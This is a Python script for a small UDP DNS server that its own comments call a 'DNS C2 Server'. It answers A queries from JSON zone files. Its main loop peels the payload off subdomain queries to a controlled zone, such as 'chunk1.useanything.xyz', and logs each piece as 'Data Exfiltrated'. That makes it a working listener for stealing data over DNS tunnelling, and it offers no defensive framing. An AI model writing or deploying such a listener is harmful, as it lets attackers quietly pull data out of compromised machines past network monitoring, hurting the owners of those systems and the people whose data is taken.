import socket, glob, json

port=53
ip='0.0.0.0'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((ip,port))

def load_zones():
    jsonZone = {}
    zoneFiles = glob.glob('zones/*.zone')

    for zone in zoneFiles:
        with open(zone) as zoneData:
            data = json.load(zoneData)
            zoneName = data["$origin"]
            jsonZone[zoneName] = data
    return jsonZone

zoneData = load_zones()

def getFlags(flags):
    byte1 = bytes(flags[:1])
    byte2 = bytes(flags[1:2])

    rflags = ''
    QR = '1'

    OPCODE = ''
    for bit in range(1,5):
        OPCODE += str(ord(byte1)&(1<<bit))

    AA = '1'
    TC = '0'
    RD = '0'
    
    # Byte 2
    RA = '0'
    Z = '000'
    RCODE = '0000'

    return int(QR+OPCODE+AA+TC+RD, 2).to_bytes(1, byteorder='big')+int(RA+Z+RCODE, 2).to_bytes(1, byteorder='big')

def getQuestionDomain(data):
    state = 0
    expectedLength = 0
    domainString = ''
    domainParts = []
    x = 0
    y = 0
    for byte in data:
        if state == 1:
            if byte != 0:
                domainString += chr(byte)
            x += 1
            if x == expectedLength:
                domainParts.append(domainString)
                domainString = ''
                state = 0
                x = 0
            if byte == 0:
                domainParts.append(domainString)
                break
        else:
            state = 1
            expectedLength = byte
        y += 1

    questionType = data[y:y+2]
    return (domainParts, questionType)

def getZone(domain):
    global zoneData
    requested_domain = '.'.join(domain).lower()

    # --- C2 LOGIC: WILDCARD MATCHING ---
    # Check if the requested domain is a subdomain of any zone we control
    for base_zone in zoneData.keys():
        if requested_domain.endswith(base_zone):
            return zoneData[base_zone]

    # CRASH-PROOFING: If random internet noise asks for a domain we don't own
    return {"a": []}

def getRecs(data):
    domain, questionType = getQuestionDomain(data)
    qt = ''
    if questionType == b'\x00\x01':
        qt = 'a'

    zone = getZone(domain) 

    # CRASH-PROOFING: Use .get() to prevent KeyError if the query isn't an A record
    return(zone.get(qt, []), qt, domain)

def buildQuestion(domainName, recType):
    qbytes = b''

    for part in domainName:
        length = len(part)
        qbytes += bytes([length])

        for char in part:
            qbytes += ord(char).to_bytes(1, byteorder='big')
        
    if recType == 'a':
        qbytes += (1).to_bytes(2, byteorder='big')

    qbytes += (1).to_bytes(2, byteorder='big')

    return qbytes

def recToBytes(domainName, recType, recTTL, recVal):
    rbytes = b'\xc0\x0c'
    
    if recType == 'a':
        rbytes = rbytes + bytes([0]) + bytes([1])

    rbytes = rbytes + bytes([0]) + bytes([1])
    rbytes += int(recTTL).to_bytes(4, byteorder='big')

    if recType == 'a':
        rbytes = rbytes + bytes([0]) + bytes([4])

        for part in recVal.split('.'):
            rbytes += bytes([int(part)])
    
    return rbytes


def buildResponse(data):
    TransactionID = data[:2]
    Flags = getFlags(data[2:4])
    QDCOUNT = b'\x00\x01'
    
    # Get answer for query
    records, recType, domainName = getRecs(data[12:])
    
    ANCOUNT = len(records).to_bytes(2, byteorder='big')
    NSCOUNT = (0).to_bytes(2, byteorder='big')
    ARCOUNT = (0).to_bytes(2, byteorder='big')

    DNS_Header = TransactionID+Flags+QDCOUNT+ANCOUNT+NSCOUNT+ARCOUNT
    DNS_Body = b''

    DNS_question = buildQuestion(domainName, recType)

    for record in records:
        DNS_Body += recToBytes(domainName, recType, record["ttl"], record["value"])

    return DNS_Header + DNS_question + DNS_Body


print("[*] DNS C2 Server Listening on 0.0.0.0:53...")

while 1:
    try:
        data, addr = sock.recvfrom(512)
        
        # --- C2 EXTRACTION LOGIC ---
        # Parse the requested domain from the packet
        domainParts, _ = getQuestionDomain(data[12:])
        requested_domain = '.'.join(domainParts).lower()
        
        for base_zone in zoneData.keys():
            # If the query is a subdomain (e.g., chunk1.useanything.xyz.)
            if requested_domain.endswith(base_zone) and requested_domain != base_zone:
                # Strip the base domain away to reveal only the payload
                chunk = requested_domain.replace('.' + base_zone, '')
                print(f"[+] Data Exfiltrated: {chunk}")
        # ---------------------------

        r = buildResponse(data)
        sock.sendto(r, addr)
        
    except Exception as e:
        # Ignore malformed packets quietly so the server doesn't crash
        pass